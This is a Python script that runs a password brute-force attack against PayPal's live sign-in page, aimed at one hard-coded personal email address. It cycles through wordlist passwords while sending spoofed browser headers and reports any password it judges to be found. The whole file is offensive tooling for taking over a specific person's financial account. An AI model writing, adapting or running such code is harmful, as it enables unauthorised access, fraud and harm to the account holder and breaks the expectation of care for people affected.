import os
import requests
import time
from datetime import datetime

# Configuration
login_url = "https://www.paypal.com/signin?locale.x=nl_NL"
email = "marylinelelei@gmail.co.uk"
wordlist_dirs = [
    "/usr/share/wordlists/",
    os.path.expanduser("~/.wordlists/"),
    os.path.expanduser("~/wordlists/"),
    os.path.expanduser("~/Documents/wordlists/"),
    os.path.expanduser("~/Downloads/wordlists/"),
    "/opt/wordlists/",
    "/var/lib/wordlists/",
]

# Find all wordlists in the system
wordlist_paths = []
for dir in wordlist_dirs:
    if os.path.exists(dir):
        for file in os.listdir(dir):
            if file.endswith(".txt") and not file.startswith("."):
                wordlist_paths.append(os.path.join(dir, file))

# If no wordlists found, prompt user
if not wordlist_paths:
    print("No wordlists found. Please provide a wordlist path or create one.")
    exit()

# Print available wordlists
print("Available wordlists:")
for i, path in enumerate(wordlist_paths):
    print(f"{i + 1}. {path}")

# Let user choose a wordlist
choice = input("Select a wordlist (number): ")
try:
    choice = int(choice) - 1
    wordlist_path = wordlist_paths[choice]
except (ValueError, IndexError):
    print("Invalid selection. Using the first wordlist.")
    wordlist_path = wordlist_paths[0]

print(f"Using wordlist: {wordlist_path}")
print(f"Starting brute-force attack on {login_url} for email: {email} at {datetime.now()}\n")

# Set headers to mimic a browser
headers = {
    "Host": "www.paypal.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept-Language": "en-GB,en;q=0.9",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "https://www.paypal.com/nl/home",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i"
}

# Load passwords from the selected wordlist
with open(wordlist_path, "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

# Try each password
for pwd in passwords:
    payload = {
        "login": email,
        "password": pwd,
        "remember_me": "true"
    }

    # Send POST request to login
    response = requests.post(login_url, headers=headers, data=payload)

    # Validate login success
    if response.status_code == 200:
        if "Welcome" in response.text or "Login successful" in response.text:
            print(f"[SUCCESS] Password found: {pwd}")
            print(f"You can now log in using the email: {email} and password: {pwd}")
            break
        else:
            print(f"[TRYING] Password: {pwd} | Status: {response.status_code} | Content: {response.text}")
    else:
        print(f"[TRYING] Password: {pwd} | Status: {response.status_code}")
        time.sleep(0.5)

print(f"Brute-force complete at {datetime.now()}")
